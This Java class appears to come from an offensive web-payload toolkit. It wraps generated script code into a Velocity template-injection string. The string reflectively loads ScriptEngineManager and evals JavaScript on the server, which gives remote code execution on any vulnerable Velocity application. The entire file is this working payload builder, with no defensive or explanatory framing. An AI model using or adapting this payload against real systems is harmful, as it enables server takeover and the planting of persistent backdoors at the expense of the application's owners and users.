package com.reajason.javaweb.packer.velocity;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class VelocityPacker implements Packer {
    String template = "#set($x='') #set($cz = $x.class.forName('javax.script.ScriptEngineManager')) $cz.getDeclaredConstructor(null).newInstance().getEngineByName('js').eval('{{script}}')";

    @Override
    public String pack(ClassPackerConfig config) {
        String script = Packers.ScriptEngine.getInstance().pack(config);
        return template.replace("{{script}}", script);
    }
}
